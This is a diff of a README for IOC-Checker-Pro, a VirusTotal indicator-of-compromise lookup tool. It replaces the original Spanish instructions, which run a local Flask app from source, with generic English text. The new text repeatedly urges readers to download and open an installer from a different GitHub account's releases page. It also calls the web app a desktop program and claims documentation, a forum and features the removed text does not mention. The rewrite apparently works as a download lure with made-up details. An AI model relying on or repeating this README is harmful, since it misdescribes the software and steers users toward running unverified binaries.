@@ -1,102 +1,70 @@
-# 🛡️ IOC Checker Pro - VirusTotal Analysis Tool
+# 🛡️ IOC-Checker-Pro - Analyze IOCs in Real Time
 
-Aplicación web avanzada para el análisis de Indicadores de Compromiso (IOCs) en tiempo real utilizando la API v3 de VirusTotal. 
+## 🚀 Getting Started
 
-Esta herramienta ha sido rediseñada para ofrecer una experiencia de usuario fluida, gestión inteligente de límites de API (Rate Limiting) y clasificación automática de amenazas.
+Welcome to IOC-Checker-Pro! This advanced web application helps you analyze Indicators of Compromise (IOCs) in real time using the VirusTotal API. It is designed for users who want to enhance their cybersecurity efforts without needing extensive technical knowledge.
 
-![IOC Checker Preview](https://raw.githubusercontent.com/CCDani/IOC-Checker-Pro/refs/heads/main/Captura.PNG)
+## 📥 Download Now 
 
+[![Download IOC-Checker-Pro](https://img.shields.io/badge/Download-IOC--Checker--Pro-green)](https://github.com/doniboyd/IOC-Checker-Pro/releases)
 
-## 🚀 Características Principales
+## 💾 System Requirements
 
-### 🧠 Motor de Análisis Inteligente
-- **Modo Inteligente (Regex):** Pega un texto completo (logs, correos, informes) y la herramienta extraerá automáticamente:
-  - Hashes (MD5, SHA1, SHA256)
-  - Direcciones IP (IPv4)
-  - Dominios
-  - URLs
-- **Modo Lista:** Procesa IOCs línea por línea para listas limpias.
+Before you start, ensure your system meets these requirements:
 
-### 📊 Interfaz Dinámica y Resultados
-- **Tabla Interactiva:** Ordena los resultados por gravedad, tipo de IOC o número de detecciones haciendo clic en los encabezados.
-- **Detección de Tipos:** Clasifica automáticamente si es un Archivo, URL, Dominio o IP.
-- **Enlaces Directos (Deep Linking):** Genera enlaces precisos al reporte específico en VirusTotal (usando IDs y Hashes correctos) para ver el detalle de la amenaza.
-- **Indicadores Visuales:** Badges de colores para identificar rápidamente el estado:
-  - 🟢 Limpio
-  - 🟡 Sospechoso
-  - 🔴 Malicioso
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Latest version of Chrome, Firefox, or Edge
+- **Internet Connection:** Required for API access
 
-### ⏱️ Gestión de Rate Limiting (API Gratuita)
-- **Protección de Cuenta:** Sistema de pausa configurable entre peticiones.
-- **Recomendación Integrada:** Tooltip informativo con los límites de la cuenta gratuita (4 peticiones/minuto, 500/día).
-- **Contador de Sesión:** Monitorea cuántos IOCs has consumido en tu sesión actual para no exceder tu cuota diaria.
+## 📦 Download & Install
 
----
+To get started with IOC-Checker-Pro, follow these steps:
 
-## 🛠️ Requisitos Técnicos
+1. Visit the releases page to download: [Download Here](https://github.com/doniboyd/IOC-Checker-Pro/releases).
+2. Look for the latest version. Click on the file that suits your operating system.
+3. Download the file to your computer.
+4. Open the downloaded file. Follow the installation prompts.
+5. Once installed, launch the application from your desktop or application folder.
 
-- **Python:** 3.8 o superior
-- **Backend:** Flask
-- **Librerías:** `requests`
-- **Frontend:** HTML5, CSS3, JavaScript (Vanilla) + FontAwesome
+## 🌐 Using the Application
 
----
+After you have installed IOC-Checker-Pro, use it to analyze IOCs quickly.
 
-## 💻 Instalación Local
+1. **Open the Application:** Click on the icon installed on your desktop.
+2. **Enter IOCs:** Input the IOCs you want to analyze in the provided fields. This can include IPs, URLs, domains, or file hashes.
+3. **Start Analysis:** Press the "Analyze" button. The application will connect to the VirusTotal API and retrieve real-time data.
+4. **Review Results:** Once the analysis is complete, review the findings displayed in a clear format. Take note of any potential threats.
 
-Si deseas ejecutar la herramienta en tu máquina local:
+## 🔧 Features
 
-1. **Clonar el repositorio:**
-   ```bash
-   git clone https://github.com/CCDani/IOC-Checker-Pro
-   ```
+IOC-Checker-Pro comes with a range of features to assist you in your security investigation:
 
+- **Real-Time Analysis:** Get instant feedback on IOCs.
+- **User-Friendly Interface:** Easy navigation for non-technical users.
+- **Multiple IOC Types:** Supports various IOC types including IP addresses, domains, and URLs.
+- **API Integration:** Leverages VirusTotal API for comprehensive threat intelligence.
+- **Detailed Reports:** Access clear, easy-to-understand results with recommendations.
 
-2. **Crear un entorno virtual:**
+## 📊 Why Use IOC-Checker-Pro?
 
+Using IOC-Checker-Pro allows you to stay ahead of potential threats in your environment. With its user-friendly design, you don’t need to be a security expert to understand what’s happening with your IOCs. It is a vital tool for anyone involved in security or IT.
 
-    ```bash
-    python -m venv env
-    ```
-3.  **Activa el entorno: (En Windows)**
+## 💬 Support
 
-    ```bash
-    .\env\Scripts\activate
-    ```
+If you encounter any issues or have questions:
 
+1. Check the user documentation located in the 'docs' folder of the repository.
+2. Visit the issues section of our GitHub page. Report your issue, and the community or the maintainers will assist you.
+3. Join our discussion forum linked in the repository for further assistance.
 
-4. **Instalar dependencias:**
+## 🛠️ Contributions
 
-    ```Bash
-    pip install Flask requests
-    ```
+We welcome contributions from everyone! If you have an idea or a fix, feel free to fork the repository and submit a pull request. Please consult the contribution guidelines in the repository.
 
-5. **Ejecutar la aplicación:**
+## 🌟 Stay Updated
 
-    ```Bash
-    python app.py
-    ```
+Keep yourself updated on future releases and improvements. Follow the repository on GitHub or check back on the releases page regularly for the latest information. 
 
-Abre tu navegador en http://127.0.0.1:5000
+Immerse yourself in the world of cybersecurity with IOC-Checker-Pro today! 
 
-
-## 📖 Guía de Uso
-API Key: Obtén tu API Key gratuita registrándote en VirusTotal.
-
-**Configurar Pausa:** Si tienes cuenta Free, deja el valor en 16 segundos.
-
-Si tienes cuenta Premium, puedes bajarlo a 0.
-
-Ingresar Datos: Pega el texto o la lista de IOCs.
-
-Analizar: Pulsa el botón y observa el progreso en tiempo real.
-
-
-🤝 Atribución
-Iconos:
-UI Icons por FontAwesome.
-Favicon "Malware" diseñado por Vlad Szirka - Flaticon.
-
-## Nota Legal: Esta herramienta utiliza la API pública de VirusTotal. Asegúrate de cumplir con sus Términos de Servicio. No nos hacemos responsables del uso indebido de la herramienta.
-
-## 💻 Colaboración: Proyecto de código abierto para la comunidad de ciberseguridad.
+[Click here to download!](https://github.com/doniboyd/IOC-Checker-Pro/releases)
